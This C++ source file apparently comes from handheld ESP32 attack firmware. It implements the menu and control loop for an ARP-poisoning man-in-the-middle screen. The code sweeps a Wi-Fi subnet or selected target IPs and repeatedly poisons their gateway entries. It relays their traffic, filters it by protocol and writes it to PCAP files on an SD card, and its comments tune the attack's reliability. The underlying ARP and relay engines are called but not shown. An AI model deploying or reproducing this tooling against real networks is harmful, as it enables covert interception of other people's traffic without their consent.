#include "NetworkMitmScreen.h"

#include "core/AchievementManager.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>
#include "ui/actions/InputTextAction.h"
#include "ui/actions/InputSelectAction.h"

static constexpr uint64_t kMinFree = 64 * 1024;

static uint16_t s_captureMask = 0;  // relay calls the filter by fn ptr
static bool mitmCaptureFilter(const uint8_t* eth, uint16_t len);  // defined below
namespace {
uint16_t    metaBit(const MitmRelay::PacketMeta& m);
const char* protoName(uint16_t bit);
void        ipStr(uint32_t ipN, char* out, size_t n);
}  // namespace

// Live Preview: the relay sink (WiFi task) writes PacketMeta into this lock-free
// ring; onUpdate() on the main loop drains it into the LogView. Preview filter
// applied on drain (UI side), so it never slows the capture path.
static uint16_t s_previewMask = 0;              // 0 = All (subset of capture)
static constexpr uint8_t PREV_RING = 64;
static volatile MitmRelay::PacketMeta s_ring[PREV_RING];
static volatile uint8_t s_ringHead = 0;         // written by WiFi task
static volatile uint8_t s_ringTail = 0;         // read by main loop

NetworkMitmScreen::~NetworkMitmScreen() {
  if (_state == STATE_RUNNING) _stop("Screen closed");
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void NetworkMitmScreen::onInit() {
  _showMenu();
}

void NetworkMitmScreen::onBack() {
  if (_state == STATE_RUNNING) {
    _stop("Stopped");
    _showMenu();
    return;
  }
  if (_state == STATE_FILTERS) { _showMenu(_menuIndex); return; }
  Screen.goBack();
}

// ── Menu ────────────────────────────────────────────────────────────────────

// Row kinds, so a row can move as the mode changes without a fixed index.
enum : uint8_t { R_MODE, R_TARGET1, R_TARGET2, R_TARGET3, R_TARGET4,
                 R_FILTERS, R_PREVIEW, R_PREVFILT, R_SAVE, R_FILENAME, R_START };

void NetworkMitmScreen::_showMenu(uint8_t selected) {
  _state = STATE_MENU;
  static const char* kModeNames[] = {"ARP Poison - All", "ARP Poison - Targets", "Passive"};
  const bool decrypted = _mode != MODE_PASSIVE;

  uint8_t n = 0;
  auto add = [&](const char* label, const String& val, uint8_t kind) {
    if (n >= MAX_ROWS) return;
    snprintf(_rowLabels[n], sizeof(_rowLabels[n]), "%s", label);  // persistent
    _subs[n] = val;
    _menuItems[n] = {_rowLabels[n], _subs[n].length() ? _subs[n].c_str() : nullptr};
    _rowKind[n] = kind; ++n;
  };
  add("Mode", kModeNames[_mode], R_MODE);
  if (_mode == MODE_TARGETS) {
    for (uint8_t i = 0; i < 4; ++i) {
      char lbl[12]; snprintf(lbl, sizeof(lbl), "Target %u", i + 1);
      add(lbl, _targets[i] ? String(_targetText[i]) : String("-"), R_TARGET1 + i);
    }
  }
  // Capture filters only mean something on decrypted traffic.
  if (decrypted) add("Capture Filters", _captureMask ? "Custom" : "All", R_FILTERS);
  add("Live Preview", _livePreview ? "On" : "Off", R_PREVIEW);
  if (_livePreview && decrypted) add("Preview Filters", _previewMask ? "Custom" : "All", R_PREVFILT);
  add("Save to File", _saveToFile ? "On" : "Off", R_SAVE);
  if (_saveToFile) add("File Name", _fileName.length() ? _fileName : String("Auto"), R_FILENAME);
  add("Start", String(), R_START);

  _rowCount = n;
  setItems(_menuItems, n, selected < n ? selected : n - 1);
}

void NetworkMitmScreen::_editTarget(uint8_t i) {
  const String prefix = WiFi.localIP().toString();
  const int dot = prefix.lastIndexOf('.');
  const String initial = _targets[i] ? String(_targetText[i])
                                     : (dot > 0 ? prefix.substring(0, dot + 1) : String());
#ifdef DEVICE_HAS_KEYBOARD
  const auto mode = InputTextAction::INPUT_TEXT;
#else
  const auto mode = InputTextAction::INPUT_IP_ADDRESS;
#endif
  String v = InputTextAction::popup("Target IP", initial, mode);
  if (InputTextAction::wasCancelled()) return;
  v.trim();
  if (v.length() == 0) { _targets[i] = 0; _targetText[i][0] = '\0'; return; }
  IPAddress ip;
  if (!ip.fromString(v)) { ShowStatusAction::show("Invalid IP", 1200); return; }
  _targets[i] = (uint32_t)ip;  // network order on ESP32
  snprintf(_targetText[i], sizeof(_targetText[i]), "%s", v.c_str());
}

void NetworkMitmScreen::onItemSelected(uint8_t index) {
  if (_state == STATE_FILTERS) {
    uint16_t& mask = _editingPreview ? _previewMask : _captureMask;
    if (index == 0) {
      mask = 0;  // All
    } else if (index < _filterRowCount) {
      mask ^= (uint16_t)(1u << _filterBitOfRow[index]);
    }
    // Preview can only narrow what capture keeps.
    if (_captureMask) _previewMask &= _captureMask;
    // SSH/DHCP pattern: pin selection, then rebuild.
    _selectedIndex = index;
    _showFilters();
    return;
  }
  if (_state != STATE_MENU || index >= _rowCount) return;
  _menuIndex = index;
  _selectedIndex = index;

  switch (_rowKind[index]) {
    case R_MODE:
      _mode = (Mode)((_mode + 1) % 3);
      _selectedIndex = 0;  // Mode is row 0; rows below change with the mode
      _showMenu(_selectedIndex);
      break;
    case R_TARGET1: case R_TARGET2: case R_TARGET3: case R_TARGET4:
      _editTarget(_rowKind[index] - R_TARGET1);
      _showMenu(_selectedIndex);
      break;
    case R_FILTERS:
      _editingPreview = false;
      _selectedIndex = 0;  // fresh list → top
      _showFilters();
      break;
    case R_PREVIEW:
      _livePreview = !_livePreview;
      _showMenu(_selectedIndex);
      break;
    case R_PREVFILT:
      _editingPreview = true;
      _selectedIndex = 0;
      _showFilters();
      break;
    case R_SAVE:
      if (!_saveToFile && (!Uni.StorageSD || !Uni.StorageSD->isAvailable())) {
        ShowStatusAction::show("SD card not available", 1500); render(); return;
      }
      _saveToFile = !_saveToFile;
      _showMenu(_selectedIndex);
      break;
    case R_FILENAME: {
      String v = InputTextAction::popup("File Name", _fileName, InputTextAction::INPUT_TEXT);
      if (!InputTextAction::wasCancelled()) { v.trim(); _fileName = v; }
      _showMenu(_selectedIndex);
      break;
    }
    case R_START:
      _start();
      break;
  }
}

void NetworkMitmScreen::_showFilters() {
  static const char* kNames[FILTER_COUNT] = {
    "ARP", "ICMP", "DNS", "DHCP", "HTTP", "TLS/HTTPS",
    "mDNS", "NTP", "SSH", "Telnet", "FTP", "Other TCP/UDP"
  };
  _state = STATE_FILTERS;
  const uint16_t mask = _editingPreview ? _previewMask : _captureMask;
  // Preview lists only protocols Capture keeps (All capture = every protocol).
  const uint16_t allowed = (_editingPreview && _captureMask) ? _captureMask : 0xFFFF;

  uint8_t n = 0;
  snprintf(_filterLabels[n], sizeof(_filterLabels[n]), "[%c] All", mask == 0 ? 'x' : ' ');
  _filterItems[n] = {_filterLabels[n], nullptr, 0, false, false};
  _filterBitOfRow[n] = 0xFF;
  ++n;

  for (uint8_t i = 0; i < FILTER_COUNT; ++i) {
    if (!(allowed & (1u << i))) continue;
    snprintf(_filterLabels[n], sizeof(_filterLabels[n]), "[%c] %s",
             (mask & (1u << i)) ? 'x' : ' ', kNames[i]);
    _filterItems[n] = {_filterLabels[n], nullptr, 0, false, false};
    _filterBitOfRow[n] = i;
    ++n;
  }
  _filterRowCount = n;

  // Same as SshClientScreen::_rebuildItems / DhcpAttackScreen::_showMenu.
  setItems(_filterItems, n, min<uint8_t>(_selectedIndex, n > 0 ? (uint8_t)(n - 1) : 0));
}

// ── Start ───────────────────────────────────────────────────────────────────

void NetworkMitmScreen::_start() {
  if (WiFi.status() != WL_CONNECTED) {
    ShowStatusAction::show("Not connected", 1500);
    return;
  }
  // Mode -> engine flags. All/Targets poison (relay, decrypted); Passive does
  // not (monitor, encrypted). Targets needs at least one IP.
  _arpEnabled     = _mode != MODE_PASSIVE;
  _snifferEnabled = _saveToFile;
  if (_mode == MODE_TARGETS) {
    uint32_t ips[4]; uint8_t nt = 0;
    for (uint8_t i = 0; i < 4; ++i) if (_targets[i]) ips[nt++] = _targets[i];
    if (nt == 0) { ShowStatusAction::show("No target set", 1500); return; }
    _arp.setTargets(ips, nt);
  } else {
    _arp.setTargets(nullptr, 0);  // full-subnet sweep
  }

  _log.clear();
  _relayUp = _arpUp = _pcapUp = false;
  _lastTargets      = 0;
  _lastProbeLost    = 0;
  _lastProbeDropped = 0;
  _gwLogged         = false;
  _phase       = PHASE_SWEEP;

  char buf[60];
  char mac[20];
  snprintf(buf, sizeof(buf), "IP: %s, gateway: %s",
           WiFi.localIP().toString().c_str(),
           WiFi.gatewayIP().toString().c_str());
  _log.addLine(buf);

  // Our MAC is what a poisoned victim should show for the gateway. Print it
  // here so the two values can be compared without leaving this screen.
  uint8_t self[6];
  WiFi.macAddress(self);
  _fmtMac(self, mac, sizeof(mac));
  snprintf(buf, sizeof(buf), "MAC: %s", mac);
  _log.addLine(buf, TFT_YELLOW);

  // Baseline heap. Serving portal files is the heaviest allocator in the whole
  // attack, so knowing what we started with tells a leak apart from simply not
  // having had the room to begin with.
  const uint32_t heap0 = ESP.getFreeHeap() / 1024;
  snprintf(buf, sizeof(buf), "Heap: %lu KB free", (unsigned long)heap0);
  _log.addLine(buf, heap0 < 40 ? TFT_RED : TFT_DARKGREY);

  // 1. Capture file. Link type depends on where the frames come from: the relay
  //    yields decrypted Ethernet, the monitor fallback raw 802.11.
  const bool relayMode = _arpEnabled;
  // A chosen file name overrides the auto SSID-based one.
  const char* nameBase = _fileName.length() ? _fileName.c_str() : WiFi.SSID().c_str();
  if (_snifferEnabled) {
    if (!Uni.StorageSD || !Uni.StorageSD->isAvailable()) {
      _log.addLine("SD card not available", TFT_RED);
      _snifferEnabled = false;
    } else if (Uni.StorageSD->freeBytes() < kMinFree) {
      _log.addLine("SD card full", TFT_RED);
      _snifferEnabled = false;
    } else {
      const uint32_t linktype = relayMode ? PcapWriter::LINKTYPE_ETHERNET
                                          : PcapWriter::LINKTYPE_IEEE802_11;
      if (_pcap.begin(Uni.StorageSD, SAVE_DIR, nameBase, linktype, MitmRelay::SNAP_LEN)) {
        _pcapUp = true;
        snprintf(buf, sizeof(buf), "PCAP: %s", _pcap.filename().c_str());
        _log.addLine(buf, TFT_GREEN);
        _log.addLine(relayMode ? "    Ethernet (decrypted)" : "    802.11 (encrypted)");
      } else {
        snprintf(buf, sizeof(buf), "%s", _pcap.error() ? _pcap.error() : "Failed to create PCAP");
        _log.addLine(buf, TFT_RED);
        _snifferEnabled = false;
      }
    }
  }

  // 2. ARP spoofer — must be up before the relay so the hook can feed it.
  if (_arpEnabled) {
    if (_arp.begin()) {
      _arpUp = true;
      snprintf(buf, sizeof(buf), "Sweeping %lu hosts...",
               (unsigned long)_arp.sweepTotal());
      _log.addLine(buf);
    } else {
      _log.addLine("Failed to start ARP spoofing", TFT_RED);
      _arpEnabled = false;
    }
  }

  // 3. The engine. Nothing above matters if this does not come up.
  if (_arpEnabled || _snifferEnabled) {
    _relay.setPcap(_pcapUp ? &_pcap : nullptr);
    _relay.setArp(_arpUp ? &_arp : nullptr);
    _relay.setForward(_arpEnabled);
    // Capture Filters only apply to decrypted (relay) traffic.
    s_captureMask = relayMode ? _captureMask : 0;
    _relay.setCaptureFilter(relayMode ? &mitmCaptureFilter : nullptr);
    // Live Preview only on decrypted (relay) traffic.
    const bool preview = _livePreview && relayMode;
    s_previewMask = preview ? _previewMask : 0;
    s_ringHead = s_ringTail = 0;
    _previewPaused = false;
    _relay.setPreviewSink(preview ? &_previewSink : nullptr);

    if (_relay.begin(relayMode ? MitmRelay::MODE_RELAY : MitmRelay::MODE_MONITOR)) {
      _relayUp = true;
      _log.addLine(relayMode ? "Relay active" : "Monitor active", TFT_GREEN);
    } else {
      snprintf(buf, sizeof(buf), "Relay: %s", _relay.error());
      _log.addLine(buf, TFT_RED);
      _stop(_relay.error());
      _showMenu();
      return;
    }
  }

  if (!_relayUp) {
    // Everything the user picked failed to come up. The per-component lines
    // above already say why; repeat the first cause in the toast so it is
    // visible without scrolling the log.
    _log.addLine("Nothing started", TFT_RED);
    _stop(_pcap.error() ? _pcap.error() : "Nothing started");
    _showMenu();
    return;
  }

  // Registered as id 52 in AchievementManager but never fired by the previous
  // implementation of this screen.
  if (Achievement.inc("wifi_mitm_started") == 1) Achievement.unlock("wifi_mitm_started");

  _state       = STATE_RUNNING;
  _lastSweep   = 0;
  _lastPoison  = 0;
  _lastDraw    = 0;
  _lastFreeChk = millis();
  setItems(nullptr, 0);
  render();
}

// ── Stop ────────────────────────────────────────────────────────────────────

void NetworkMitmScreen::_stop(const char* reason) {
  // Tear the relay down before touching the ARP table: its RX hook calls
  // observe(), which writes the same entries restore() is about to walk.
  if (_relayUp) { _relay.end(); _relayUp = false; }

  // Then un-poison. A victim left with our MAC cached loses its network until
  // the entry ages out, which can take minutes. Transmitting does not depend on
  // the relay, so ordering it after the teardown costs nothing.
  if (_arpUp) {
    _arp.restore();
    _arp.end();
    _arpUp = false;
  }
  if (_pcapUp)  { _pcap.end(); _pcapUp = false; }

  _arpEnabled = _snifferEnabled = false;
  _state      = STATE_MENU;

  char buf[64];
  snprintf(buf, sizeof(buf), "%s - %lu frames",
           reason ? reason : "Stopped", (unsigned long)_pcap.frames());
  ShowStatusAction::show(buf, 2000);
}

// ── Update ──────────────────────────────────────────────────────────────────

void NetworkMitmScreen::onUpdate() {
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  const unsigned long now = millis();

  if (_relayUp) _relay.update();

  // The gateway usually answers within the first second of the sweep; print its
  // real MAC as soon as it is known, before any poisoning takes effect.
  if (_arpUp && !_gwLogged && _arp.gatewayKnown()) {
    _gwLogged = true;
    char mac[20], line[60];
    _fmtMac(_arp.gatewayMac(), mac, sizeof(mac));
    snprintf(line, sizeof(line), "Gateway: %s", mac);
    _log.addLine(line, TFT_CYAN);
  }

  if (_arpUp) {
    // Answers to reachability probes the driver refused. Runs every iteration
    // and paces itself — it has to get in ahead of everything else here, since
    // a probe left unanswered costs the victim.
    _arp.flushRetries();

    // Sweeping and poisoning now run side by side: a rescan must never pause
    // the attack on hosts already known.
    if (!_arp.sweepDone() && now - _lastSweep > 80) {
      _arp.sweepStep();
      _lastSweep = now;

      if (_arp.sweepDone() && _phase == PHASE_SWEEP) {
        _phase      = PHASE_POISON;
        _lastRescan = now;
        char buf[60];
        snprintf(buf, sizeof(buf), "%d hosts, gateway: %s",
                 _arp.targetCount(), _arp.gatewayKnown() ? "ok" : "UNKNOWN");
        _log.addLine(buf, _arp.gatewayKnown() ? TFT_GREEN : TFT_RED);
        if (!_arp.gatewayKnown())
          _log.addLine("Gateway MAC not found, skipping poisoning", TFT_RED);
      }
    }

    if (_phase == PHASE_POISON) {
      // Frequent but tiny. poisonStep() now emits two frames (one target, both
      // directions) plus a broadcast every fourth call, so this is ~7 frames a
      // second — the same rate as the old one-second batch of seven, just
      // spread out. The batch was the problem: the WiFi TX buffers come from
      // the heap, and with a portal page being served the pool is empty by the
      // second frame of any burst.
      if (now - _lastPoison > 300) {
        _arp.poisonStep();
        _lastPoison = now;
      }

      // One pass only finds hosts that were awake and quick. Re-arm the sweep
      // periodically so sleeping devices and new joiners get picked up.
      if (now - _lastRescan > 120000) {
        _arp.restartSweep();
        _lastRescan = now;
      }

      // A lost gateway claim is the failure mode that looks like nothing at all:
      // the victim silently goes back to the real gateway and the attack is
      // over with every counter still climbing. The two causes need different
      // fixes, so they get different lines — reporting a full queue as TX
      // starvation sends the next person debugging this the wrong way.
      if (_arp.probeLost() != _lastProbeLost) {
        _lastProbeLost = _arp.probeLost();
        char buf[52];
        snprintf(buf, sizeof(buf), "%lu gateway claims lost, TX starved",
                 (unsigned long)_lastProbeLost);
        _log.addLine(buf, TFT_RED);
      }
      if (_arp.probeDropped() != _lastProbeDropped) {
        _lastProbeDropped = _arp.probeDropped();
        char buf[52];
        snprintf(buf, sizeof(buf), "%lu gateway claims dropped, queue full",
                 (unsigned long)_lastProbeDropped);
        _log.addLine(buf, TFT_RED);
      }

      if (_arp.targetCount() != _lastTargets) {
        _lastTargets = _arp.targetCount();
        char buf[48];
        snprintf(buf, sizeof(buf), "Poisoning %d hosts", _lastTargets);
        _log.addLine(buf, TFT_GREEN);
      }
    }
  }

  if (_relayUp && _relay.storageFailed()) {
    _log.addLine("Failed to write to SD", TFT_RED);
    _stop("Failed to write to SD");
    _showMenu();
    return;
  }

  if (_pcapUp && now - _lastFreeChk > 5000) {
    _lastFreeChk = now;
    if (!_checkFreeSpace()) {
      _stop("SD full");
      _showMenu();
      return;
    }
  }

  // The status bar is one line on a 240 px screen and cannot hold every
  // counter — it was being cut off exactly when the numbers mattered. Dump a
  // compact snapshot into the log instead, where it scrolls and stays readable.
  if (now - _lastStats > 10000) {
    _lastStats = now;
    char s[60];
    // Two lines, because S is the one that settles what is actually wrong and
    // it must not be the field that gets truncated. S counts every frame the
    // RX hook was handed; F how many of those were relayed. S flat while the
    // victim is poisoned means its traffic is not reaching us at all — a
    // different failure from S climbing with F stuck, which would be the relay
    // refusing to forward.
    snprintf(s, sizeof(s), "[=] S%lu F%lu X%lu L%lu",
             (unsigned long)_relay.seen(),
             (unsigned long)_relay.forwarded(),
             (unsigned long)_relay.txFailed(),
             (unsigned long)_relay.loopDropped());
    _log.addLine(s, TFT_DARKGREY);

    // G counts the router broadcasting its own address, which corrects every
    // cache on the segment at once. The two heap figures are free now and the
    // low-water mark: this board has no PSRAM, and the WiFi driver takes its RX
    // buffers from the same heap the web server allocates from, so a low
    // minimum means frames were being dropped before the relay ever saw them.
    snprintf(s, sizeof(s), "[=] A%lu!%lu R%lu!%lud%lu G%lu %luk/%luk",
             (unsigned long)_arp.arpSent(),
             (unsigned long)_arp.arpFailed(),
             (unsigned long)_arp.probeRetried(),
             (unsigned long)_arp.probeLost(),
             (unsigned long)_arp.probeDropped(),
             (unsigned long)_arp.gatewayAnnounced(),
             (unsigned long)(ESP.getFreeHeap() / 1024),
             (unsigned long)(ESP.getMinFreeHeap() / 1024));
    _log.addLine(s, TFT_DARKGREY);
    _lastDraw = 0;
  }

  if (now - _lastDraw > 800) {
    render();
    _lastDraw = now;
  }

  // Drain the preview ring into the log (unless the preview is paused). Capture
  // never pauses — only the on-screen list freezes for inspection.
  if (_livePreview && _arpEnabled && !_previewPaused) {
    char line[64];
    while (s_ringTail != s_ringHead) {
      volatile MitmRelay::PacketMeta& v = s_ring[s_ringTail];
      MitmRelay::PacketMeta m;
      m.ethertype = v.ethertype; m.ipProto = v.ipProto;
      m.srcIp = v.srcIp; m.dstIp = v.dstIp;
      m.srcPort = v.srcPort; m.dstPort = v.dstPort; m.length = v.length;
      s_ringTail = (uint8_t)((s_ringTail + 1) % PREV_RING);
      const uint16_t bit = metaBit(m);
      if (s_previewMask && !(s_previewMask & bit)) continue;   // preview filter
      char src[16] = "", dst[16] = "";
      if (m.ethertype == 0x0800) { ipStr(m.srcIp, src, sizeof(src)); ipStr(m.dstIp, dst, sizeof(dst)); }
      // Multi-line on IP flows so src/dst fit the narrow screen:
      //   TLS  192.168.1.10:443 >
      //        192.168.1.50:52341  1420B
      if (m.srcPort || m.dstPort) {
        snprintf(line, sizeof(line), "%-5s %s:%u >",
                 protoName(bit), src, m.srcPort);
        _log.addLine(line);
        snprintf(line, sizeof(line), "      %s:%u  %uB",
                 dst, m.dstPort, m.length);
        _log.addLine(line, TFT_DARKGREY);
      } else if (m.ethertype == 0x0800) {
        snprintf(line, sizeof(line), "%-5s %s >", protoName(bit), src);
        _log.addLine(line);
        snprintf(line, sizeof(line), "      %s  %uB", dst, m.length);
        _log.addLine(line, TFT_DARKGREY);
      } else {
        snprintf(line, sizeof(line), "%-5s  %uB", protoName(bit), m.length);
        _log.addLine(line);
      }
    }
  }

  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK) {
      _stop("Stopped");
      _showMenu();
    } else if (dir == INavigation::DIR_PRESS && _livePreview && _arpEnabled) {
      // Pause/resume the on-screen preview; capture keeps running.
      _previewPaused = !_previewPaused;
      render();
    } else if (dir == INavigation::DIR_PRESS) {
      _stop("Stopped");   // no preview: a press stops, as before
      _showMenu();
    }
  }
}

void NetworkMitmScreen::_fmtMac(const uint8_t* mac, char* out, size_t n) {
  snprintf(out, n, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

bool NetworkMitmScreen::_checkFreeSpace() {
  return Uni.StorageSD && Uni.StorageSD->freeBytes() >= kMinFree;
}

void NetworkMitmScreen::onRender() {
  if (_state == STATE_RUNNING) { _drawLog(); return; }
  ListScreen::onRender();
}

// ── Status bar ──────────────────────────────────────────────────────────────

void NetworkMitmScreen::_drawLog() {
  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
    [](Sprite& sp, int barY, int w, void* ud) {
      auto* s = static_cast<NetworkMitmScreen*>(ud);
      sp.setTextDatum(TL_DATUM);
      char label[48];

      if (s->_arpUp && s->_phase == PHASE_SWEEP) {
        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
        snprintf(label, sizeof(label), "Sweep %lu/%lu  found %d",
                 (unsigned long)s->_arp.sweepProgress(),
                 (unsigned long)s->_arp.sweepTotal(),
                 s->_arp.targetCount());
      } else {
        // Deliberately short: the full picture goes to the log every 10 s, and
        // a truncated status line is worse than a terse one.
        const uint32_t pcapN = s->_pcap.frames();
        const bool     gwOk  = s->_arp.gatewayKnown();

        int n = snprintf(label, sizeof(label), "H%d %s F%lu",
                         s->_arp.targetCount(),
                         s->_arpUp ? (gwOk ? "GWok" : "GW??") : "----",
                         (unsigned long)s->_relay.forwarded());
        if (pcapN) snprintf(label + n, sizeof(label) - n, " P%lu", (unsigned long)pcapN);

        const bool broken = (s->_arpUp && !gwOk);
        sp.setTextColor(broken ? TFT_RED : TFT_GREEN, TFT_BLACK);
      }
      sp.drawString(label, 2, barY);

      // Preview paused marker, centred, so it's obvious capture continues while
      // the list is frozen.
      if (s->_livePreview && s->_arpEnabled && s->_previewPaused) {
        sp.setTextDatum(TC_DATUM);
        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
        sp.drawString("PAUSED", w / 2, barY);
      }

      // Free heap on the right, alongside the low-water mark. The WiFi driver
      // takes its TX buffers from this heap, so the minimum is what says
      // whether the poison is about to start failing.
      const uint32_t heapK = (uint32_t)(ESP.getFreeHeap() / 1024);
      const uint32_t minK  = (uint32_t)(ESP.getMinFreeHeap() / 1024);

      char right[28];
      snprintf(right, sizeof(right), "%luk/%luk",
               (unsigned long)heapK, (unsigned long)minK);

      sp.setTextDatum(TR_DATUM);
      sp.setTextColor(minK < 15 ? TFT_RED : TFT_MAGENTA, TFT_BLACK);
      sp.drawString(right, w - 2, barY);
    }, this);
}

// Etapa 1 capture filter: true when the decrypted Ethernet frame matches the
// Capture Filters (All passes everything). Reads only headers (EtherType, IP
// protocol, TCP/UDP ports) to decide which packets to keep — never content.
static bool mitmCaptureFilter(const uint8_t* eth, uint16_t len) {
  using M = NetworkMitmScreen;
  const uint16_t m = s_captureMask;
  if (m == 0) return true;            // All
  if (len < 14) return m & M::F_OTHER;
  const uint16_t ethertype = (eth[12] << 8) | eth[13];
  if (ethertype == 0x0806) return m & M::F_ARP;
  if (ethertype != 0x0800) return m & M::F_OTHER;   // non-IPv4
  if (len < 14 + 20) return m & M::F_OTHER;
  const uint8_t* ip = eth + 14;
  const uint8_t ihl = (ip[0] & 0x0F) * 4;
  const uint8_t proto = ip[9];
  if (proto == 1) return m & M::F_ICMP;
  if (proto == 6 || proto == 17) {   // TCP / UDP
    const uint8_t* l4 = ip + ihl;
    if (len < (uint16_t)(14 + ihl + 4)) return m & M::F_OTHER;
    const uint16_t sp = (l4[0] << 8) | l4[1], dp = (l4[2] << 8) | l4[3];
    auto hit = [&](uint16_t port, uint16_t bit) {
      return (sp == port || dp == port) && (m & bit);
    };
    if (hit(53, M::F_DNS))    return true;
    if (hit(67, M::F_DHCP) || hit(68, M::F_DHCP)) return true;
    if (hit(80, M::F_HTTP))   return true;
    if (hit(443, M::F_TLS))   return true;
    if (hit(5353, M::F_MDNS)) return true;
    if (hit(123, M::F_NTP))   return true;
    if (hit(22, M::F_SSH))    return true;
    if (hit(23, M::F_TELNET)) return true;
    if (hit(21, M::F_FTP))    return true;
    return m & M::F_OTHER;
  }
  return m & M::F_OTHER;
}


// WiFi-task callback: stash header-only metadata, drop if the ring is full
// (preview is best-effort; the PCAP is the record). Cheap and non-blocking.
void NetworkMitmScreen::_previewSink(const MitmRelay::PacketMeta& m) {
  const uint8_t next = (uint8_t)((s_ringHead + 1) % PREV_RING);
  if (next == s_ringTail) return;   // full — skip
  volatile MitmRelay::PacketMeta& slot = s_ring[s_ringHead];
  slot.ethertype = m.ethertype; slot.ipProto = m.ipProto;
  slot.srcIp = m.srcIp; slot.dstIp = m.dstIp;
  slot.srcPort = m.srcPort; slot.dstPort = m.dstPort; slot.length = m.length;
  s_ringHead = next;
}

namespace {
// Which FilterBit a packet's metadata maps to, for the preview filter.
uint16_t metaBit(const MitmRelay::PacketMeta& m) {
  using M = NetworkMitmScreen;
  if (m.ethertype == 0x0806) return M::F_ARP;
  if (m.ethertype != 0x0800) return M::F_OTHER;
  if (m.ipProto == 1) return M::F_ICMP;
  if (m.ipProto == 6 || m.ipProto == 17) {
    const uint16_t sp = m.srcPort, dp = m.dstPort;
    auto is = [&](uint16_t p){ return sp == p || dp == p; };
    if (is(53))   return M::F_DNS;
    if (is(67) || is(68)) return M::F_DHCP;
    if (is(80))   return M::F_HTTP;
    if (is(443))  return M::F_TLS;
    if (is(5353)) return M::F_MDNS;
    if (is(123))  return M::F_NTP;
    if (is(22))   return M::F_SSH;
    if (is(23))   return M::F_TELNET;
    if (is(21))   return M::F_FTP;
  }
  return M::F_OTHER;
}

const char* protoName(uint16_t bit) {
  switch (bit) {
    case NetworkMitmScreen::F_ARP:  return "ARP";
    case NetworkMitmScreen::F_ICMP: return "ICMP";
    case NetworkMitmScreen::F_DNS:  return "DNS";
    case NetworkMitmScreen::F_DHCP: return "DHCP";
    case NetworkMitmScreen::F_HTTP: return "HTTP";
    case NetworkMitmScreen::F_TLS:  return "TLS";
    case NetworkMitmScreen::F_MDNS: return "mDNS";
    case NetworkMitmScreen::F_NTP:  return "NTP";
    case NetworkMitmScreen::F_SSH:  return "SSH";
    case NetworkMitmScreen::F_TELNET: return "Telnet";
    case NetworkMitmScreen::F_FTP:  return "FTP";
    default: return "TCP/UDP";
  }
}

void ipStr(uint32_t ipN, char* out, size_t n) {
  const uint8_t* b = (const uint8_t*)&ipN;   // network order bytes
  snprintf(out, n, "%u.%u.%u.%u", b[0], b[1], b[2], b[3]);
}
}  // namespace
